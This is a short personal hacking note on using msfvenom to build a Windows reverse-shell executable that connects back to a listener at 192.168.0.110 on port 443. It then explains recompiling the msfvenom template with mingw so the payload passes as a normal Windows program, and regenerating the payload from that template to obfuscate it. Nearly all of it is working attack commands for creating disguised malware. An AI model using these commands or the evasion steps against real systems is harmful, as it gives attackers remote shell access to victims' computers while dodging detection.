
Tags: [[Hacking]] [[Malware]]

---

## Usage
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.110 LPORT=443 -f exe > malware
```

- -p specifies the payload
- LHOST specifies your IP
- LPORT specifies the port por the connection
- -f specifies file extension

## Obfuscating

### recompiling it
In kali linux, the msfvenom templates are located in `/usr/share/metasploit-framework/data/templates/src/pe/exe`

so we need to recompile the file `template.c` with a windows compiler (mingw-w64), so it passes as a **normal compiled windows program**

```
i686-w64-mingw32-gcc template.c -lws2_32 -o malware.exe
```

#### regenerating the malware
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.110 LPORT=443 -x malware.exe -f c > malware_obs.exe`